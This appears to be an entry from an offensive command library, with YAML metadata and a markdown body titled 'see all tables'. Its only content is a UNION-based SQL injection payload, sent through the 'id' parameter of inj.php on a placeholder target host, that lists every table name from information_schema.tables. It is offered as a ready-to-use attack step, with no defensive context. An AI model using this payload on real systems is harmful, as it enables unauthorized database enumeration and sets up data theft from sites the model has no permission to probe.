---
id: 2f4b7d0d-58e6-4b5e-bbf8-f5481c901b7b
name: see all tables
type: command
executor: bash
data: 'http://target-ip/inj.php?id=1 union all select 1,2,3,table_name,5 FROM information_schema.tables

  '
output: null
created_at: '2020-07-14T18:14:46.799195+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# see all tables

```bash
http://target-ip/inj.php?id=1 union all select 1,2,3,table_name,5 FROM information_schema.tables

```
